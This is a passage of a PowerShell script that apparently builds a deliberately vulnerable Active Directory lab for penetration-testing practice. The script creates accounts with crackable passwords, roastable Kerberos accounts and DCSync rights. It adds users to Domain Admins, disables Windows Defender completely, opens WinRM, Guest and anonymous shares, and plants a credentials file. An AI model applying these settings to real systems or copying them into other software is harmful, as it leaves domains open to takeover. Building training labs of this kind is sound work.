                Write-ColorOutput "  [!] New-ADUser failed for $($user.Username): $($_.Exception.Message)" "Red"
                Write-ColorOutput "  [!] OU Path used: $ou" "Yellow"
                throw
            }
            
            Write-ColorOutput "  [+] Created user: $($user.Username) (Password: $($user.Password))" "Green"
        } catch {
            Write-ColorOutput "  [!] Error creating user $($user.Username): $($_.Exception.Message)" "Red"
        }
    }
    
    # Create a privileged user for initial attack path (credentials in open share)
    Write-ColorOutput "[*] Creating privileged user for attack path..." "Yellow"
    $privilegedUsername = "backup_admin"
    $privilegedPassword = "robert"
    
    try {
        $existingPriv = Get-ADUser -Filter "SamAccountName -eq '$privilegedUsername'" -ErrorAction SilentlyContinue
        if ($existingPriv) {
            Write-ColorOutput "  [+] Privileged user $privilegedUsername already exists" "Green"
        } else {
            $securePassword = ConvertTo-SecureString $privilegedPassword -AsPlainText -Force
            $itOU = "OU=IT,OU=Departments,$domainDN"
            
            New-ADUser -Name "Backup Administrator" `
                -GivenName "Backup" `
                -Surname "Administrator" `
                -SamAccountName $privilegedUsername `
                -UserPrincipalName "$privilegedUsername@$DomainName" `
                -Path $itOU `
                -AccountPassword $securePassword `
                -Enabled $true `
                -PasswordNeverExpires $true `
                -CannotChangePassword $false `
                -Title "Backup Administrator" `
                -Department "IT" `
                -ErrorAction Stop
            
            Write-ColorOutput "  [+] Created privileged user: $privilegedUsername" "Green"
        }
        
        # Add user to Backup Operators group (can be used for privilege escalation)
        try {
            Add-ADGroupMember -Identity "Backup Operators" -Members $privilegedUsername -ErrorAction SilentlyContinue
            Write-ColorOutput "  [+] Added $privilegedUsername to Backup Operators group" "Green"
        } catch {
            # User might already be in group
        }
        
        # Also add to Server Admins group for additional attack paths
        try {
            Add-ADGroupMember -Identity "Server Admins" -Members $privilegedUsername -ErrorAction SilentlyContinue
            Write-ColorOutput "  [+] Added $privilegedUsername to Server Admins group" "Green"
        } catch {
            # User might already be in group
        }
        
        # Grant Replicate Directory Changes right for DCSync attack path
        try {
            $domainDN = (Get-ADDomain).DistinguishedName
            $userDN = (Get-ADUser -Identity $privilegedUsername).DistinguishedName
            $domainObj = [ADSI]"LDAP://$domainDN"
            $secDesc = $domainObj.ObjectSecurity
            
            # Get the user's SID
            $userObj = [ADSI]"LDAP://$userDN"
            $userSid = New-Object System.Security.Principal.SecurityIdentifier($userObj.objectSid[0], 0)
            
            # Create access rule for Replicate Directory Changes using ExtendedRight
            # GUID for Replicate Directory Changes: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
            $guidRepl = [guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userSid, "ExtendedRight", "Allow", $guidRepl, "All")
            $secDesc.AddAccessRule($ace)
            $domainObj.CommitChanges()
            
            Write-ColorOutput "  [+] Granted Replicate Directory Changes right (enables DCSync attack)" "Green"
        } catch {
            Write-ColorOutput "  [!] Could not grant replication rights: $($_.Exception.Message)" "Yellow"
        }
        
    } catch {
        Write-ColorOutput "  [!] Error creating privileged user: $($_.Exception.Message)" "Red"
    }
    
    Write-ColorOutput "[+] Users created" "Green"
}

# Function to create vulnerable Kerberos users
function New-VulnerableKerberosUsers {
    Write-ColorOutput "[*] Creating vulnerable Kerberos users and services..." "Yellow"
    
    $domainDN = (Get-ADDomain).DistinguishedName
    $serviceOU = "OU=ServiceAccounts,$domainDN"
    
    # Create AS-REP roastable user (no pre-auth required)
    # Passwords from rockyou.txt for easy cracking
    $asrepUsers = @(
        @{Username="svc_backup"; Password="welcome"; Description="Backup Service Account"},
        @{Username="svc_sql"; Password="football"; Description="SQL Service Account"},
        @{Username="admin_legacy"; Password="jesus"; Description="Legacy Admin Account"}
    )
    
    foreach ($user in $asrepUsers) {
        $existing = $null
        try {
            $existing = Get-ADUser -Identity $user.Username -ErrorAction Stop
        } catch {
            # User doesn't exist, that's fine
        }

        if ($existing) {
            Set-ADAccountControl -Identity $user.Username -DoesNotRequirePreAuth $true
            Write-ColorOutput "  [+] AS-REP roastable user $($user.Username) already exists, updated" "Green"
        } else {
            $securePassword = ConvertTo-SecureString $user.Password -AsPlainText -Force
            New-ADUser -Name $user.Username `
                -SamAccountName $user.Username `
                -UserPrincipalName "$($user.Username)@$DomainName" `
                -Path $serviceOU `
                -AccountPassword $securePassword `
                -Enabled $true `
                -PasswordNeverExpires $true `
                -Description $user.Description

            Set-ADAccountControl -Identity $user.Username -DoesNotRequirePreAuth $true
            Write-ColorOutput "  [+] Created AS-REP roastable user: $($user.Username) (Password: $($user.Password))" "Green"
        }
    }
    
    # Create Kerberoastable service accounts (SPNs)
    # Note: svc_mssql is configured with Domain Admin privileges for attack path
    # Passwords from rockyou.txt for easy cracking
    $kerberoastUsers = @(
        @{Username="svc_http"; Password="ninja"; SPN="HTTP/web01.$DomainName"; Description="Web Service Account"; IsPrivileged=$false},
        @{Username="svc_mssql"; Password="mustang"; SPN="MSSQLSvc/sql01.$DomainName:1433"; Description="MSSQL Service Account - DOMAIN ADMIN"; IsPrivileged=$true},
        @{Username="svc_exchange"; Password="password1"; SPN="exchange/mail.$DomainName"; Description="Exchange Service Account"; IsPrivileged=$false},
        @{Username="svc_iis"; Password="charlie"; SPN="HTTP/iis01.$DomainName"; Description="IIS Service Account"; IsPrivileged=$false}
    )
    
    foreach ($user in $kerberoastUsers) {
        $existing = $null
        try {
            $existing = Get-ADUser -Identity $user.Username -ErrorAction Stop
        } catch {
            # User doesn't exist, that's fine
        }

        if ($existing) {
            Set-ADUser -Identity $user.Username -ServicePrincipalNames @{Replace=@($user.SPN)}
            Write-ColorOutput "  [+] Kerberoastable user $($user.Username) already exists, updated" "Green"
        } else {
            $securePassword = ConvertTo-SecureString $user.Password -AsPlainText -Force
            New-ADUser -Name $user.Username `
                -SamAccountName $user.Username `
                -UserPrincipalName "$($user.Username)@$DomainName" `
                -Path $serviceOU `
                -AccountPassword $securePassword `
                -Enabled $true `
                -PasswordNeverExpires $true `
                -Description $user.Description `
                -ErrorAction Stop

            Set-ADUser -Identity $user.Username -ServicePrincipalNames @{Add=$user.SPN}
            Write-ColorOutput "  [+] Created Kerberoastable user: $($user.Username) (Password: $($user.Password), SPN: $($user.SPN))" "Green"
        }
        
        # If this is a privileged account, add to Domain Admins for attack path
        if ($user.IsPrivileged) {
            try {
                Add-ADGroupMember -Identity "Domain Admins" -Members $user.Username -ErrorAction SilentlyContinue
                Write-ColorOutput "  [+] Added $($user.Username) to Domain Admins group (ATTACK PATH)" "Yellow"
            } catch {
                Write-ColorOutput "  [!] Could not add $($user.Username) to Domain Admins: $($_.Exception.Message)" "Red"
            }
        }
    }
    
    Write-ColorOutput "[+] Vulnerable Kerberos users created" "Green"
}

# Function to add users to groups based on their departments and roles
function Add-UsersToGroups {
    Write-ColorOutput "[*] Adding users to groups based on departments and roles..." "Yellow"
    
    # Department-based group mappings
    $departmentGroups = @{
        "IT" = @("IT Department", "Server Admins")
        "Finance" = @("Finance Team")
        "HR" = @("HR Staff")
        "Sales" = @("Sales Team")
        "Operations" = @("Share Users")
    }
    
    # Role-based group mappings (based on Title)
    $roleGroups = @{
        "Help Desk" = @("Help Desk")
        "IT Support" = @("Help Desk")
        "Support Specialist" = @("Help Desk")
        "Developer" = @("Developers")
        "Software Developer" = @("Developers")
        "Full Stack Developer" = @("Developers")
        "Senior Developer" = @("Developers")
        "Database Admin" = @("Database Admins")
        "Network Admin" = @("Network Admins")
        "System Administrator" = @("Server Admins", "Account Operators")
        "Senior System Admin" = @("Server Admins", "Account Operators")
        "Infrastructure Admin" = @("Server Admins", "Account Operators")
        "IT Manager" = @("Server Admins", "Account Operators")
        "IT Specialist" = @("Help Desk")
        "Security Analyst" = @("Server Admins")
        "Senior Admin" = @("Server Admins", "Account Operators")
        "Accountant" = @("Finance Team")
        "Accounting Manager" = @("Finance Team")
        "Payroll Manager" = @("Finance Team")
        "Payroll Specialist" = @("Finance Team")
        "HR Manager" = @("HR Staff")
        "HR Coordinator" = @("HR Staff")
        "Recruiter" = @("HR Staff")
        "Sales Manager" = @("Sales Team")
        "Sales Representative" = @("Sales Team")
        "Account Executive" = @("Sales Team")
        "Sales Director" = @("Sales Team")
        "Operations Manager" = @("Share Users")
        "Operations Coordinator" = @("Share Users")
        "Operations Analyst" = @("Share Users")
    }
    
    # Users to add to Domain Admins (for attack paths)
    $domainAdminUsers = @("jsmith", "mthomas", "backup_admin")
    
    # Users to add to DNS Admins (for attack paths)
    $dnsAdminUsers = @("crodriguez", "jwilson")
    
    # Users to add to other privileged groups
    $privilegedGroups = @{
        "Account Operators" = @("jsmith", "mthomas", "slewis", "lwalker")
        "Backup Operators" = @("backup_admin", "dhernandez", "mhall")
        "Server Admins" = @("jsmith", "mthomas", "jgarcia", "dhernandez", "jwilson", "slewis", "lwalker", "mhall")
        "Database Admins" = @("dhernandez", "jgarcia")
        "Network Admins" = @("crodriguez", "jwilson")
    }
    
    # Get all users from AD
    $allUsers = Get-ADUser -Filter * -Properties Department, Title -ErrorAction SilentlyContinue | 
        Where-Object { $_.SamAccountName -notin @("Administrator", "Guest", "krbtgt", "DefaultAccount", "WDAGUtilityAccount") }
    
    $usersAdded = 0
    
    # Add users to department groups
    foreach ($user in $allUsers) {
        $dept = $user.Department
        $title = $user.Title
        $username = $user.SamAccountName
        
        if ($dept -and $departmentGroups.ContainsKey($dept)) {
            foreach ($groupName in $departmentGroups[$dept]) {
                try {
                    Add-ADGroupMember -Identity $groupName -Members $username -ErrorAction SilentlyContinue
                    Write-ColorOutput "  [+] Added $username to $groupName (Department: $dept)" "Green"
                    $usersAdded++
                } catch {
                    # User might already be in group or group doesn't exist
                }
            }
        }
        
        # Add users to role-based groups
        if ($title) {
            foreach ($roleKey in $roleGroups.Keys) {
                if ($title -like "*$roleKey*") {
                    foreach ($groupName in $roleGroups[$roleKey]) {
                        try {
                            Add-ADGroupMember -Identity $groupName -Members $username -ErrorAction SilentlyContinue
                            Write-ColorOutput "  [+] Added $username to $groupName (Role: $title)" "Green"
                            $usersAdded++
                        } catch {
                            # User might already be in group
                        }
                    }
                }
            }
        }
    }
    
    # Add users to Domain Admins
    Write-ColorOutput "  [*] Adding users to Domain Admins group..." "Cyan"
    foreach ($username in $domainAdminUsers) {
        try {
            $user = Get-ADUser -Filter "SamAccountName -eq '$username'" -ErrorAction SilentlyContinue
            if ($user) {
                Add-ADGroupMember -Identity "Domain Admins" -Members $username -ErrorAction SilentlyContinue
                Write-ColorOutput "  [+] Added $username to Domain Admins (ATTACK PATH)" "Yellow"
                $usersAdded++
            }
        } catch {
            Write-ColorOutput "  [!] Could not add $username to Domain Admins: $($_.Exception.Message)" "Red"
        }
    }
    
    # Create DNS Admins group if it doesn't exist and add users
    Write-ColorOutput "  [*] Ensuring DNS Admins group exists..." "Cyan"
    try {
        $dnsAdminsGroup = Get-ADGroup -Identity "DNS Admins" -ErrorAction SilentlyContinue
        if (-not $dnsAdminsGroup) {
            New-ADGroup -Name "DNS Admins" -GroupScope Global -GroupCategory Security -Description "DNS administration permissions"
            Write-ColorOutput "  [+] Created DNS Admins group" "Green"
        }
        
        foreach ($username in $dnsAdminUsers) {
            try {
                $user = Get-ADUser -Filter "SamAccountName -eq '$username'" -ErrorAction SilentlyContinue
                if ($user) {
                    Add-ADGroupMember -Identity "DNS Admins" -Members $username -ErrorAction SilentlyContinue
                    Write-ColorOutput "  [+] Added $username to DNS Admins (ATTACK PATH)" "Yellow"
                    $usersAdded++
                }
            } catch {
                Write-ColorOutput "  [!] Could not add $username to DNS Admins: $($_.Exception.Message)" "Red"
            }
        }
    } catch {
        Write-ColorOutput "  [!] Error with DNS Admins group: $($_.Exception.Message)" "Red"
    }
    
    # Add users to other privileged groups
    foreach ($groupName in $privilegedGroups.Keys) {
        foreach ($username in $privilegedGroups[$groupName]) {
            try {
                $user = Get-ADUser -Filter "SamAccountName -eq '$username'" -ErrorAction SilentlyContinue
                if ($user) {
                    Add-ADGroupMember -Identity $groupName -Members $username -ErrorAction SilentlyContinue
                    Write-ColorOutput "  [+] Added $username to $groupName" "Green"
                    $usersAdded++
                }
            } catch {
                # User might already be in group
            }
        }
    }
    
    Write-ColorOutput "[+] Added $usersAdded group membership(s)" "Green"
    Write-ColorOutput "  [*] Users added to Domain Admins: jsmith, mthomas, backup_admin" "Cyan"
    Write-ColorOutput "  [*] Users added to DNS Admins: crodriguez, jwilson" "Cyan"
}

# Function to disable Windows Defender completely
function Disable-WindowsDefender {
    Write-ColorOutput "[*] Disabling Windows Defender completely..." "Yellow"
    Write-ColorOutput "  [*] This is required for testing attacks without interference" "Cyan"
    
    try {
        # Check if Windows Defender module is available
        $defenderModule = Get-Module -ListAvailable -Name "ConfigDefender" -ErrorAction SilentlyContinue
        if (-not $defenderModule) {
            Write-ColorOutput "  [*] Windows Defender module not found, using registry and service methods" "Yellow"
        }
        
        # Method 1: Disable via Set-MpPreference (if available)
        try {
            Import-Module ConfigDefender -ErrorAction SilentlyContinue
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableRemovableDriveScanning $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
            Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue  # Disable cloud protection
            Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue  # Never send samples
            Write-ColorOutput "  [+] Disabled Windows Defender real-time protection via Set-MpPreference" "Green"
        } catch {
            Write-ColorOutput "  [*] Set-MpPreference method not available, using registry method" "Yellow"
        }
        
        # Method 2: Disable via Registry (more reliable)
        $regPaths = @(
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet",
            "HKLM:\SOFTWARE\Microsoft\Windows Defender",
            "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
        )
        
        foreach ($regPath in $regPaths) {
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
        }
        
        # Disable Windows Defender via Group Policy registry keys
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        
        # Disable Real-Time Protection
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        
        # Disable Cloud Protection
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 2 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "LocalSettingOverrideSpynetReporting" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        
        # Disable Network Protection
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection" -Name "EnableNetworkProtection" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        
        # Also set in the non-policy location (for systems without Group Policy)
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        
        Write-ColorOutput "  [+] Disabled Windows Defender via registry" "Green"
        
        # Method 3: Stop and disable Windows Defender service
        $services = @("WinDefend", "Sense", "WdNisSvc", "SecurityHealthService")
        foreach ($serviceName in $services) {
            try {
                $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
                if ($service) {
                    Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
                    Set-Service -Name $serviceName -StartupType Disabled -ErrorAction SilentlyContinue
                    Write-ColorOutput "  [+] Stopped and disabled service: $serviceName" "Green"
                }
            } catch {
                # Service might not exist on this system
            }
        }
        
        # Method 4: Add exclusions for common attack tool paths
        try {
            $exclusions = @(
                "C:\Windows\Temp\*",
                "C:\Temp\*",
                "C:\Users\*\AppData\Local\Temp\*",
                "C:\ProgramData\*",
                "C:\Windows\System32\*",
                "C:\Windows\SysWOW64\*"
            )
            
            foreach ($exclusion in $exclusions) {
                try {
                    Add-MpPreference -ExclusionPath $exclusion -ErrorAction SilentlyContinue
                } catch {
                    # May fail if Defender is already disabled
                }
            }
            Write-ColorOutput "  [+] Added exclusions for common paths" "Green"
        } catch {
            # Exclusions may not be needed if Defender is fully disabled
        }
        
        # Method 5: Disable Windows Defender via Group Policy (if GPO module available)
        try {
            Import-Module GroupPolicy -ErrorAction SilentlyContinue
            $gpoName = "DisableWindowsDefender"
            $gpo = Get-GPO -Name $gpoName -ErrorAction SilentlyContinue
            if (-not $gpo) {
                $gpo = New-GPO -Name $gpoName -Comment "Disable Windows Defender for penetration testing"
                
                # Set registry values via GPO
                Set-GPRegistryValue -Name $gpoName -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" -ValueName "DisableAntiSpyware" -Type DWord -Value 1 -ErrorAction SilentlyContinue
                Set-GPRegistryValue -Name $gpoName -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -ValueName "DisableRealtimeMonitoring" -Type DWord -Value 1 -ErrorAction SilentlyContinue
                
                # Link to local computer
                $domainDN = (Get-ADDomain).DistinguishedName
                New-GPLink -Name $gpoName -Target $domainDN -ErrorAction SilentlyContinue
                
                Write-ColorOutput "  [+] Created GPO to disable Windows Defender" "Green"
            }
        } catch {
            # GPO method may not be available
        }
        
        # Force Group Policy update
        gpupdate /force 2>$null | Out-Null
        
        Write-ColorOutput "[+] Windows Defender disabled completely" "Green"
        Write-ColorOutput "  [*] Real-time protection: Disabled" "Cyan"
        Write-ColorOutput "  [*] Services: Stopped and disabled" "Cyan"
        Write-ColorOutput "  [*] Registry: Configured to disable Defender" "Cyan"
        Write-ColorOutput "  [*] Cloud protection: Disabled" "Cyan"
        Write-ColorOutput "  [*] Note: A reboot may be required for full effect" "Yellow"
        
    } catch {
        Write-ColorOutput "  [!] Error disabling Windows Defender: $($_.Exception.Message)" "Red"
        Write-ColorOutput "  [*] You may need to disable it manually via Group Policy or registry" "Yellow"
    }
}

# Function to enable WinRM
function Enable-WinRMService {
    Write-ColorOutput "[*] Enabling WinRM..." "Yellow"
    
    # Enable WinRM
    Enable-PSRemoting -Force -SkipNetworkProfileCheck
    
    # Configure WinRM for HTTP (less secure but easier for training)
    winrm quickconfig -force -q
    winrm set winrm/config/service/auth '@{Basic="true"}'
    winrm set winrm/config/service '@{AllowUnencrypted="true"}'
    
    # Configure firewall rule
    New-NetFirewallRule -DisplayName "WinRM HTTP" -Direction Inbound -LocalPort 5985 -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
    
    Write-ColorOutput "[+] WinRM enabled and configured" "Green"
}

# Function to enable Guest account
function Enable-GuestAccount {
    Write-ColorOutput "[*] Enabling Guest account..." "Yellow"
    
    try {
        # Enable Guest account locally
        $guest = Get-LocalUser -Name "Guest" -ErrorAction SilentlyContinue
        if ($guest) {
            Enable-LocalUser -Name "Guest"
            Write-ColorOutput "  [+] Guest account enabled locally" "Green"
        }
        
        # Also enable in AD if it exists
        try {
            $adGuest = Get-ADUser -Identity "Guest" -ErrorAction SilentlyContinue
            if ($adGuest) {
                Enable-ADAccount -Identity "Guest"
                # Remove password requirement for Guest
                Set-ADAccountControl -Identity "Guest" -PasswordNotRequired $true -ErrorAction SilentlyContinue
                Write-ColorOutput "  [+] AD Guest account enabled" "Green"
            }
        } catch {
            # Guest might not exist in AD yet, that's okay
        }
        
        # Enable Guest access via registry (allows null session access)
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LimitBlankPasswordUse" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name "RestrictNullSessAccess" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Write-ColorOutput "  [+] Guest/null session access enabled via registry" "Green"
        
    } catch {
        Write-ColorOutput "  [!] Could not enable Guest account: $($_.Exception.Message)" "Yellow"
    }
}

# Function to create SMB shares
function New-SMBShares {
    Write-ColorOutput "[*] Creating SMB shares..." "Yellow"
    
    # Enable Guest account first
    Enable-GuestAccount
    
    $sharesPath = "C:\Shares"
    if (-not (Test-Path $sharesPath)) {
        New-Item -ItemType Directory -Path $sharesPath -Force | Out-Null
    }
    
    $shares = @(
        @{Name="IT_Documents"; Path="$sharesPath\IT_Documents"; Description="IT Department Documents"},
        @{Name="Finance_Reports"; Path="$sharesPath\Finance_Reports"; Description="Finance Reports"},
        @{Name="Public"; Path="$sharesPath\Public"; Description="Public Share"},
        @{Name="HR_Files"; Path="$sharesPath\HR_Files"; Description="HR Files"},
        @{Name="Backup"; Path="$sharesPath\Backup"; Description="Backup Share"},
        @{Name="Shared"; Path="$sharesPath\Shared"; Description="Shared Documents - Open Access"}
    )
    
    foreach ($share in $shares) {
        # Create directory
        if (-not (Test-Path $share.Path)) {
            New-Item -ItemType Directory -Path $share.Path -Force | Out-Null
        }
        
        # Remove share if exists
        $existing = Get-SmbShare -Name $share.Name -ErrorAction SilentlyContinue
        if ($existing) {
            Remove-SmbShare -Name $share.Name -Force -ErrorAction SilentlyContinue
        }
        
        # Create share with Everyone access by default
        New-SmbShare -Name $share.Name -Path $share.Path -Description $share.Description -FullAccess "Everyone" -ErrorAction SilentlyContinue
        
        Write-ColorOutput "  [+] Created share: $($share.Name)" "Green"
    }
    
    # Configure Public share to allow Guest access (both share and NTFS permissions)
    try {
        Grant-SmbShareAccess -Name "Public" -AccountName "Everyone" -AccessRight Full -Force -ErrorAction SilentlyContinue
        Grant-SmbShareAccess -Name "Public" -AccountName "Guest" -AccessRight Full -Force -ErrorAction SilentlyContinue
        
        # Set NTFS permissions for Guest and Everyone on Public share using icacls (more reliable)
        # Remove existing permissions and set new ones
        icacls "$sharesPath\Public" /inheritance:r /grant "Everyone:(OI)(CI)F" /grant "Guest:(OI)(CI)F" /grant "ANONYMOUS LOGON:(OI)(CI)RX" 2>$null | Out-Null
        
        # Also set via PowerShell ACL for redundancy
        $publicAcl = Get-Acl $sharesPath\Public
        
        # Remove any deny rules first
        $publicAcl.Access | Where-Object { $_.AccessControlType -eq "Deny" } | ForEach-Object {
            $publicAcl.RemoveAccessRule($_) | Out-Null
        }
        
        # Add Guest account (NT AUTHORITY\Guest)
        $guestSid = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::AccountGuestSid, $null)
        $guestRule = New-Object System.Security.AccessControl.FileSystemAccessRule($guestSid, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $publicAcl.SetAccessRule($guestRule)
        
        # Add Everyone
        $everyoneSid = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::WorldSid, $null)
        $everyoneRule = New-Object System.Security.AccessControl.FileSystemAccessRule($everyoneSid, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $publicAcl.SetAccessRule($everyoneRule)
        
        # Add Anonymous
        $anonymousSid = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::AnonymousSid, $null)
        $anonymousRule = New-Object System.Security.AccessControl.FileSystemAccessRule($anonymousSid, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")
        $publicAcl.SetAccessRule($anonymousRule)
        
        Set-Acl -Path "$sharesPath\Public" -AclObject $publicAcl
        
        Write-ColorOutput "  [+] Configured Public share for Guest access (share + NTFS permissions)" "Green"
    } catch {
        Write-ColorOutput "  [!] Could not configure Guest access: $($_.Exception.Message)" "Yellow"
    }
    
    # Configure Shared share for anonymous/guest access (vulnerable share with credentials)
    try {
        Grant-SmbShareAccess -Name "Shared" -AccountName "Everyone" -AccessRight Full -Force -ErrorAction SilentlyContinue
        Grant-SmbShareAccess -Name "Shared" -AccountName "Guest" -AccessRight Full -Force -ErrorAction SilentlyContinue
        Grant-SmbShareAccess -Name "Shared" -AccountName "ANONYMOUS LOGON" -AccessRight Read -Force -ErrorAction SilentlyContinue
        
        # Set NTFS permissions to allow Guest, Everyone, and Anonymous access using icacls (more reliable)
        # Remove existing permissions and set new ones
        icacls "$sharesPath\Shared" /inheritance:r /grant "Everyone:(OI)(CI)F" /grant "Guest:(OI)(CI)F" /grant "ANONYMOUS LOGON:(OI)(CI)F" 2>$null | Out-Null
        
        # Also set via PowerShell ACL for redundancy
        $sharedAcl = Get-Acl $sharesPath\Shared
        
        # Remove any deny rules first
        $sharedAcl.Access | Where-Object { $_.AccessControlType -eq "Deny" } | ForEach-Object {
            $sharedAcl.RemoveAccessRule($_) | Out-Null
        }
        
        # Add Guest account
        $guestSid = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::AccountGuestSid, $null)
        $guestRule = New-Object System.Security.AccessControl.FileSystemAccessRule($guestSid, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $sharedAcl.SetAccessRule($guestRule)
        
        # Add Everyone
        $everyoneSid = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::WorldSid, $null)
        $everyoneRule = New-Object System.Security.AccessControl.FileSystemAccessRule($everyoneSid, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $sharedAcl.SetAccessRule($everyoneRule)
        
        # Add Anonymous
        $anonymousSid = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::AnonymousSid, $null)
        $anonymousRule = New-Object System.Security.AccessControl.FileSystemAccessRule($anonymousSid, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $sharedAcl.SetAccessRule($anonymousRule)
        
        Set-Acl -Path "$sharesPath\Shared" -AclObject $sharedAcl
        
        Write-ColorOutput "  [+] Configured Shared share for anonymous/guest access (share + NTFS permissions) (VULNERABLE)" "Yellow"
    } catch {
        Write-ColorOutput "  [!] Could not configure Shared share access: $($_.Exception.Message)" "Yellow"
    }
    
    # Remove Guest from other shares (except Public and Shared)
    foreach ($share in $shares) {
        if ($share.Name -ne "Public" -and $share.Name -ne "Shared") {
            Revoke-SmbShareAccess -Name $share.Name -AccountName "Guest" -Force -ErrorAction SilentlyContinue
        }
    }
    
    Write-ColorOutput "[+] SMB shares created" "Green"
}

# Function to create realistic files in shares
function New-RealisticFiles {
    Write-ColorOutput "[*] Creating realistic files in shares..." "Yellow"
    
    $sharesPath = "C:\Shares"
    
    # IT_Documents share files
    $itFiles = @(
        @{Path="$sharesPath\IT_Documents\Network_Diagram.txt"; Content="Network Infrastructure Diagram`n`nCore Switch: 10.0.0.1`nDMZ Router: 10.0.0.2`nInternal DNS: 10.0.0.10"},
        @{Path="$sharesPath\IT_Documents\Server_Inventory.xlsx"; Content="Server Inventory List`n`nWeb01 - 10.0.0.20`nSQL01 - 10.0.0.21`nFile01 - 10.0.0.22"},
        @{Path="$sharesPath\IT_Documents\Password_Policy.txt"; Content="Password Policy Requirements`n`n- Minimum 8 characters`n- Must contain uppercase and lowercase`n- Must contain numbers"},
        @{Path="$sharesPath\IT_Documents\credentials.txt"; Content="IT Department Credentials`n`nService Account: svc_backup`nPassword: welcome`n`nNote: Keep this secure!"}
    )
    
    # Finance_Reports share files
    $financeFiles = @(
        @{Path="$sharesPath\Finance_Reports\Q1_Report.txt"; Content="Q1 Financial Report`n`nRevenue: $1,250,000`nExpenses: $850,000`nProfit: $400,000"},
        @{Path="$sharesPath\Finance_Reports\Budget_2024.xlsx"; Content="2024 Budget Planning`n`nIT Budget: $500,000`nHR Budget: $300,000`nOperations: $200,000"},
